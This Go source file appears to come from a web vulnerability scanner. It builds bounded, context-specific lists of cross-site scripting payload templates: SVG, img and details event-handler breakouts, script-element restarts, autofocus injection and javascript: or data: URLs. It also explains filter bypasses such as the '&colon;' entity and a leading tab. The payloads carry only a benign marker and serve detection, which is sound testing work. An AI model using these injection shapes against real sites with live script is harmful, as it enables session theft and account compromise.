package detection

// This file is the OPT-IN VARIATION PACK generator.
//
// A canonical candidate set answers "what is the most likely breakout here?".
// That single answer is fragile: if the one shape for a context is filtered,
// rewritten by the server, or simply not the shape the browser executes at
// that position, the injection point is real but the scan reports nothing.
// The packs below answer a second question — "what OTHER mechanisms reach an
// executable position here?" — with a small, ordered, deterministic list per
// reflection context.
//
// Boundaries, all enforced by tests:
//
//   - BOUNDED. At most maxVariantsPerContext (5) variants per context, each a
//     distinct MECHANISM, never five spellings of the same tag. The whole
//     plan additionally caps variation candidates at
//     MaxVariationCandidatesPerInjectionPoint (10) after deduplication.
//   - DETERMINISTIC. No randomness, mutation loop, or word list: the packs are
//     literal tables, emitted in a fixed order with fixed priorities.
//   - BENIGN. Every variant embeds only the same benign marker as every other
//     candidate: no alert(), cookie access, network call, or DOM exfiltration.
//     The handler body / script body is the bare marker, so an executing
//     variant raises a marker-named ReferenceError, never a weaponized payload.
//   - HONEST ABOUT TRIGGERS. A variant that needs an action after navigation
//     declares TriggerInteraction (the same class the evasion families use);
//     the verifier may dispatch one bounded activation only for a recognized
//     declared mechanism. Everything that can fire during load declares
//     TriggerLoad and sorts first.
//   - NEEDS-AWARE. A variant whose required canary characters the site
//     provably neutralizes is not planned at all: the point of a pack is a
//     working alternative, so an impossible shape would only add requests.
//     (Canonical candidates keep the older deprioritize-never-drop rule; this
//     stricter rule is opt-in extra probing, not default behaviour.)
//
// Gating: nothing here is planned unless PlanOptions.EnableVariationPacks is
// set — or the scan already opted into evasion (PlanOptions.EnableEvasion),
// the operator gate that already exists end to end (CLI -enable-evasion / API
// enable_evasion). The default plan is byte-identical to before this file
// existed; TestVariationPacksAreOffByDefault and the frozen default-plan
// golden test enforce that.

// maxVariantsPerContext is the hard size of one context's pack. Mechanism
// diversity is the point; a sixth shape would be noise.
const maxVariantsPerContext = 5

// MaxVariationCandidatesPerInjectionPoint bounds how many DISTINCT variation
// candidates one injection point's plan can contain, after deduplication.
// Derivation: six contexts × five variants = 30 is the theoretical worst case
// for a response that reflects into all six; a cap of 10 keeps the common
// one-to-three-context page well inside the candidate profile's own cap
// (standard 8 / thorough 16 / hard ceiling 32), and a page that genuinely
// hits four or more contexts is still bounded rather than growing with the
// response. The cap is applied in plan order, so the highest-likelihood
// variants always win.
const MaxVariationCandidatesPerInjectionPoint = 10

// variationTpl builds one variation-pack template: a literal shape with an
// explicit mechanism name and trigger class.
func variationTpl(value, needs string, priority int, why, mechanism, trigger string) candTemplate {
	return candTemplate{
		value:     value,
		needs:     needs,
		priority:  priority,
		rationale: why,
		trigger:   trigger,
		variation: mechanism,
	}
}

// variationTemplatesFor returns the opt-in variation pack for a site's context,
// ADDITIONAL TO (never instead of) templatesFor's canonical set and
// evasionTemplatesFor's bypass set. Contexts with no pack return nil.
func variationTemplatesFor(a ContextAnalysis, m string) []candTemplate {
	switch variationPack(a) {
	case "html":
		return htmlVariationTemplates(a, m)
	case "attribute":
		return attributeVariationTemplates(a, m)
	case "js_string":
		return jsStringVariationTemplates(a, m)
	case "js_template_literal":
		return jsTemplateVariationTemplates(a, m)
	case "script_block":
		return scriptBlockVariationTemplates(m)
	case "url_attribute":
		return urlAttributeVariationTemplates(m)
	default:
		return nil
	}
}

// variationPack names the pack a context belongs to, or "" for no pack.
// Precedence follows the innermost context: a template literal is its own pack
// even though it is also a JS string, and an inert script data block is the
// script_block case that genuinely NEEDS a </script> breakout (its body is
// never executed as JavaScript).
func variationPack(a ContextAnalysis) string {
	switch {
	case a.Context == CtxJSString && a.Sub == "template_literal":
		return "js_template_literal"
	case a.Context == CtxJSString && (a.Sub == "single_quoted" || a.Sub == "double_quoted"):
		return "js_string"
	case a.Context == CtxJSCode || (a.Context == CtxUnknown && a.Sub == "script_data_block"):
		return "script_block"
	case categoryOf(a.Context) == CatHTMLText:
		return "html"
	case categoryOf(a.Context) == CatHTMLAttr:
		return "attribute"
	case a.Context == CtxURL && (a.Sub == "start" || a.Sub == "relative_first_segment"):
		return "url_attribute"
	default:
		return ""
	}
}

// htmlVariationTemplates covers element/body content. The first three shapes
// are the mechanisms the canonical set already prefers (SVG load, image error,
// details toggle) — kept in the pack, at the same values, so the pack is a
// complete ordered answer per context and deduplication collapses them onto
// their canonical instance. The last two are mechanisms the canonical set does
// NOT carry: a plain script ELEMENT (no event handler at all, so a filter that
// strips on*= attributes cannot stop it) and the same element in SVG foreign
// content (a distinct parser path).
func htmlVariationTemplates(a ContextAnalysis, m string) []candTemplate {
	p := closingPrefix(a)
	return []candTemplate{
		variationTpl(p+"<svg onload="+m+">", "<>", 90,
			prefixReason(p, "inject an <svg> element whose onload handler references the benign marker — the canonical SVG load trigger"),
			"svg_load", TriggerLoad),
		variationTpl(p+"<img src=x onerror="+m+">", "<>", 88,
			prefixReason(p, "inject an <img> with a deliberately broken src so onerror fires without interaction — a resource-error trigger, independent of SVG support"),
			"img_error", TriggerLoad),
		variationTpl(p+"<script>"+m+"</script>", "<>", 84,
			prefixReason(p, "inject a script element whose whole body is the marker: the parser executes it on insertion, so this needs NO event handler and survives a filter that strips on*= attributes"),
			"inline_script", TriggerLoad),
		variationTpl(p+"<details open ontoggle="+m+">", "<>", 80,
			prefixReason(p, "inject a <details open> element whose ontoggle handler fires as soon as it is parsed — a toggle trigger rather than a load/error one"),
			"details_toggle", TriggerLoad),
		variationTpl(p+"<svg><script>"+m+"</script></svg>", "<>", 78,
			prefixReason(p, "inject a script element inside SVG foreign content: a distinct parser path from an HTML script element, and still handler-free"),
			"svg_script", TriggerLoad),
	}
}

// attributeVariationTemplates covers a quoted or unquoted attribute value.
// The first shape breaks out of the tag and injects an SVG load trigger (the
// canonical vector); the middle shape stays INSIDE the tag and adds an
// autofocus element (no < or > needed); the rest break out of the tag and use
// a script element or a different auto-firing event, so a filter that blocks
// SVG specifically, or every on*= handler, still leaves a route.
func attributeVariationTemplates(a ContextAnalysis, m string) []candTemplate {
	var q, needs string
	switch a.Quote {
	case "double":
		q, needs = `"`, `"`
	case "single":
		q, needs = `'`, `'`
	default:
		q, needs = "", ""
	}
	breakoutNeeds := needs + "<>"

	focus := q + " autofocus onfocus=" + m + " x=" + q
	focusWhy := "close the attribute and add an autofocus/onfocus pair on the existing element: autofocus fires during page load, and this needs no < or > at all"
	if q == "" {
		focus = " autofocus onfocus=" + m + " "
		focusWhy = "add an autofocus/onfocus attribute pair (the unquoted value ends at whitespace): autofocus fires during page load and no < or > is needed"
	}

	return []candTemplate{
		variationTpl(q+"><svg onload="+m+">", breakoutNeeds, 90,
			"break out of the attribute and tag, then inject an <svg> with an onload handler — the canonical element-breakout vector",
			"tag_breakout_svg", TriggerLoad),
		variationTpl(focus, needs, 87, focusWhy, "in_tag_focus", TriggerLoad),
		variationTpl(q+"><script>"+m+"</script>", breakoutNeeds, 86,
			"break out of the attribute and tag, then inject a handler-free script element: no event attribute is involved, so an on*= stripping filter cannot stop it",
			"tag_breakout_script", TriggerLoad),
		variationTpl(q+"><img src=x onerror="+m+">", breakoutNeeds, 84,
			"break out and inject an <img> whose broken src fires onerror — a resource-error trigger independent of SVG",
			"tag_breakout_img", TriggerLoad),
		variationTpl(q+"><details open ontoggle="+m+">", breakoutNeeds, 78,
			"break out and inject a <details open> whose ontoggle fires on parse — a toggle trigger independent of load/error handlers",
			"tag_breakout_details", TriggerLoad),
	}
}

// jsStringVariationTemplates covers a single- or double-quoted JS string. The
// first two shapes are the canonical quote breakout and the script-element
// restart; the rest close the SCRIPT element (the HTML tokenizer does not
// track JS string state) and inject an HTML element instead of a new script
// block — a route that survives quote escaping, backslash escaping, and a
// filter that blocks <script> openings.
func jsStringVariationTemplates(a ContextAnalysis, m string) []candTemplate {
	q := `"`
	if a.Sub == "single_quoted" {
		q = `'`
	}
	return []candTemplate{
		variationTpl(q+";"+m+"//", q, 90,
			"close the "+quoteWord(q)+" JS string and reference the marker as a statement — the canonical quote breakout",
			"quote_breakout", TriggerLoad),
		variationTpl("</script><script>"+m+"</script>", "<>", 88,
			"end the script element with a literal </script> (the tokenizer ignores JS string state) and open a fresh handler-free script block",
			"script_restart", TriggerLoad),
		variationTpl("</script><svg onload="+m+">", "<>", 85,
			"end the script element and continue in HTML with an SVG load trigger: different mechanism from starting a new script block",
			"script_close_svg", TriggerLoad),
		variationTpl("</script><img src=x onerror="+m+">", "<>", 83,
			"end the script element and continue in HTML with a resource-error trigger",
			"script_close_img", TriggerLoad),
		variationTpl("</script><details open ontoggle="+m+">", "<>", 77,
			"end the script element and continue in HTML with a parse-time toggle trigger",
			"script_close_details", TriggerLoad),
	}
}

// jsTemplateVariationTemplates covers the ${...} case. Interpolation is the
// canonical shape because it needs no quote, backtick or angle bracket; the
// rest are the routes left when the reader escapes the interpolation opener:
// closing the literal with a backtick, restarting the script element, or
// leaving the script element for HTML.
func jsTemplateVariationTemplates(a ContextAnalysis, m string) []candTemplate {
	return []candTemplate{
		variationTpl("${"+m+"}", "", 85,
			"interpolate the marker as ${MARKER}: substitution evaluates inside the template literal without needing any quote, angle bracket or backtick",
			"interpolation", TriggerLoad),
		variationTpl("`;"+m+"//", "", 83,
			"close the template literal with a backtick and reference the marker as a statement; the canary cannot observe backtick handling, so this is sent as a fallback that a reader escaping ${ is likely to leave open",
			"literal_close", TriggerLoad),
		variationTpl("</script><script>"+m+"</script>", "<>", 81,
			"end the script element with a literal </script> and open a fresh script block — no quote, backtick or interpolation needed",
			"script_restart", TriggerLoad),
		variationTpl("</script><svg onload="+m+">", "<>", 79,
			"end the script element and continue in HTML with an SVG load trigger",
			"script_close_svg", TriggerLoad),
		variationTpl("</script><img src=x onerror="+m+">", "<>", 77,
			"end the script element and continue in HTML with a resource-error trigger",
			"script_close_img", TriggerLoad),
	}
}

// scriptBlockVariationTemplates covers a position directly inside a <script>
// element whose body a browser does not execute as JavaScript (an inert data
// block, or a code position where the direct marker route is unavailable).
// The direct marker is inert there, so every variant leaves the element: the
// ONLY route out is a literal </script>, after which the markup parser is back
// in HTML. Order is by likelihood of what the page does next.
func scriptBlockVariationTemplates(m string) []candTemplate {
	return []candTemplate{
		variationTpl("</script><svg onload="+m+">", "<>", 84,
			"end the inert script block and continue in HTML with an SVG load trigger — this is the confirmed lab vector for a script-block position",
			"script_close_svg", TriggerLoad),
		variationTpl("</script><script>"+m+"</script>", "<>", 82,
			"end the inert script block and start a fresh, executable script block whose whole body is the marker",
			"script_restart", TriggerLoad),
		variationTpl("</script><img src=x onerror="+m+">", "<>", 80,
			"end the inert script block and continue in HTML with a resource-error trigger",
			"script_close_img", TriggerLoad),
		variationTpl("</script><details open ontoggle="+m+">", "<>", 76,
			"end the inert script block and continue in HTML with a parse-time toggle trigger",
			"script_close_details", TriggerLoad),
	}
}

// urlAttributeVariationTemplates covers href/src/action at a scheme position.
// Every shape here needs the link to be activated, so all four declare
// TriggerInteraction. The verifier may dispatch one bounded click only for a
// recognized declared mechanism; unsupported forms remain rejected and surface
// manual-review evidence. The mechanisms are distinct: plain scheme, an HTML
// entity for ':' (decoded by the browser BEFORE URL parsing, so a filter matching
// the literal "javascript:" misses it), leading C0 whitespace (stripped by the
// URL parser before the scheme, defeating a start-anchored filter), and a data:
// URI whose document carries the marker (a different navigation target entirely).
func urlAttributeVariationTemplates(m string) []candTemplate {
	return []candTemplate{
		variationTpl("javascript:"+m, "", 90,
			"inject a javascript: scheme so the marker runs when the link is activated — the canonical URL vector",
			"scheme_injection", TriggerInteraction),
		variationTpl("javascript&colon;"+m, "", 86,
			"write the scheme's colon as the HTML entity &colon;: the browser decodes character references in the attribute value BEFORE parsing the URL, so this is a live javascript: URL, while a filter matching the literal \"javascript:\" never sees the colon it looks for",
			"entity_colon", TriggerInteraction),
		variationTpl("\tjavascript:"+m, "", 84,
			"lead with an ASCII tab: the URL parser strips leading C0 control/space characters before reading the scheme, so this parses as javascript:, while a filter anchored at the start of the value misses it",
			"leading_whitespace", TriggerInteraction),
		variationTpl("data:text/html,<script>"+m+"</script>", "<>", 55,
			"navigate to a data: URI whose document runs the marker — a different navigation target from a javascript: URL",
			"data_uri", TriggerInteraction),
	}
}
